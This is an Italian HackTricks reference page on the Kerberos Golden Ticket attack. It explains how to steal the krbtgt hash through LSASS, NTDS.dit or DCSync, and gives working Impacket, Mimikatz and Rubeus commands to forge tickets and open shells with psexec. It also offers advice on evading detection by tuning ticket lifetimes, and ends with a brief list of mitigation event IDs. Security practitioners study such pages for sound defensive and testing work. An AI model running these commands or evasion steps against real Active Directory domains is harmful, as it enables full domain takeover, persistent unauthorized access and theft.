# Golden Ticket

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Golden ticket

Un attacco **Golden Ticket** consiste nella **creazione di un legittimo Ticket Granting Ticket (TGT) impersonando qualsiasi utente** attraverso l'uso dell'**hash NTLM dell'account krbtgt di Active Directory (AD)**. Questa tecnica è particolarmente vantaggiosa perché **consente l'accesso a qualsiasi servizio o macchina** all'interno del dominio come l'utente impersonato. È fondamentale ricordare che le **credenziali dell'account krbtgt non vengono mai aggiornate automaticamente**.

Per **acquisire l'hash NTLM** dell'account krbtgt, possono essere utilizzati vari metodi. Può essere estratto dal **processo Local Security Authority Subsystem Service (LSASS)** o dal file **NT Directory Services (NTDS.dit)** situato su qualsiasi Domain Controller (DC) all'interno del dominio. Inoltre, **eseguire un attacco DCsync** è un'altra strategia per ottenere questo hash NTLM, che può essere eseguito utilizzando strumenti come il modulo **lsadump::dcsync** in Mimikatz o lo script **secretsdump.py** di Impacket. È importante sottolineare che per effettuare queste operazioni, di solito sono necessari **privilegi di amministratore di dominio o un livello di accesso simile**.

Sebbene l'hash NTLM sia un metodo valido per questo scopo, è **fortemente consigliato** forgiare i ticket utilizzando le chiavi di crittografia avanzata del **Advanced Encryption Standard (AES) Kerberos (AES128 e AES256)** per motivi di sicurezza operativa.


{% code title="Da Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Da Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

Una volta che hai iniettato il **Golden Ticket**, puoi accedere ai file condivisi **(C$)** ed eseguire servizi e WMI, quindi puoi utilizzare **psexec** o **wmiexec** per ottenere una shell (sembra che non sia possibile ottenere una shell tramite winrm).

### Eludere le rilevazioni comuni

I modi più frequenti per rilevare un Golden Ticket sono **ispezionare il traffico Kerberos** sulla rete. Per impostazione predefinita, Mimikatz **firma il TGT per 10 anni**, il che risulterà anomalo nelle successive richieste TGS effettuate con esso.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utilizza i parametri `/startoffset`, `/endin` e `/renewmax` per controllare l'offset di avvio, la durata e il numero massimo di rinnovi (tutti in minuti).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Sfortunatamente, la durata del TGT non viene registrata nei log di 4769, quindi non troverai queste informazioni nei log degli eventi di Windows. Tuttavia, ciò che puoi correlare è **vedere 4769 senza un precedente 4768**. Non è possibile richiedere un TGS senza un TGT e se non c'è alcun record di emissione di un TGT, possiamo dedurre che sia stato falsificato offline.

Per **eludere questo controllo di rilevamento**, controlla i ticket diamond:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigazione

* 4624: Accesso all'account
* 4672: Accesso amministrativo
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Altri piccoli trucchi che i difensori possono fare sono **avvisare in caso di 4769 per utenti sensibili**, come l'account amministratore del dominio predefinito.

## Riferimenti
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
